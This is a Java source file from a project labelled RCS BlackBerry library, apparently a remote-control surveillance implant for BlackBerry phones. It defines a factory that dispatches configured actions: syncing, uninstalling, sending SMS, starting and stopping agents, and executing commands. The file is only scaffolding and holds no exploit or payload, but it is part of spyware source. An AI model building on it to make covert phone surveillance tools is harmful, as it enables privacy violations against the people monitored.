/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : SubAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.action;

import com.ht.rcs.blackberry.Status;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public abstract class SubAction {
    protected static Debug debug = new Debug("SubAction", DebugLevel.VERBOSE);

    public static final int ACTION = 0x4000;
    public static final int ACTION_SYNC = ACTION + 0x1;
    public static final int ACTION_UNINSTALL = ACTION + 0x2;
    public static final int ACTION_RELOAD = ACTION + 0x3;
    public static final int ACTION_SMS = ACTION + 0x4;
    public static final int ACTION_TOOTHING = ACTION + 0x5;
    public static final int ACTION_START_AGENT = ACTION + 0x6;
    public static final int ACTION_STOP_AGENT = ACTION + 0x7;
    public static final int ACTION_SYNC_PDA = ACTION + 0x8;
    public static final int ACTION_EXECUTE = ACTION + 0x9;

    public int ActionId;

    protected boolean wantUninstall;
    protected boolean wantReload;

    protected Status statusObj;

    public static SubAction Factory(int ActionId, byte[] confParams) {
        switch (ActionId) {
            case ACTION_SYNC:
                debug.trace("Factory ACTION_SYNC");
                return new SyncAction(ActionId, confParams);
            case ACTION_UNINSTALL:
                debug.trace("Factory ACTION_UNINSTALL");
                return new UninstallAction(ActionId, confParams);
            case ACTION_RELOAD:
                debug.trace("Factory ACTION_RELOAD");
                return new ReloadAction(ActionId, confParams);
            case ACTION_SMS:
                debug.trace("Factory ACTION_SMS");
                return new SmsAction(ActionId, confParams);
            case ACTION_TOOTHING:
                debug.trace("Factory ACTION_TOOTHING");
                return new ToothingAction(ActionId, confParams);
            case ACTION_START_AGENT:
                debug.trace("Factory ACTION_START_AGENT");
                return new StartAgentAction(ActionId, confParams);
            case ACTION_STOP_AGENT:
                debug.trace("Factory ACTION_STOP_AGENT");
                return new StopAgentAction(ActionId, confParams);
            case ACTION_SYNC_PDA:
                debug.trace("Factory ACTION_SYNC_PDA");
                return new SyncPdaAction(ActionId, confParams);
            case ACTION_EXECUTE:
                debug.trace("Factory ACTION_EXECUTE");
                return new ExecuteAction(ActionId, confParams);
            default:
                return null;
        }
    }

    protected SubAction(int actionId) {
        statusObj = Status.getInstance();
        this.ActionId = actionId;
    }

    protected abstract boolean Parse(byte[] confParams);

    public abstract boolean Execute();

    public boolean WantUninstall() {
        return wantUninstall;
    }

    public boolean WantReload() {
        return wantReload;
    }

    public String toString() {
        return "" + ActionId;
    }
}
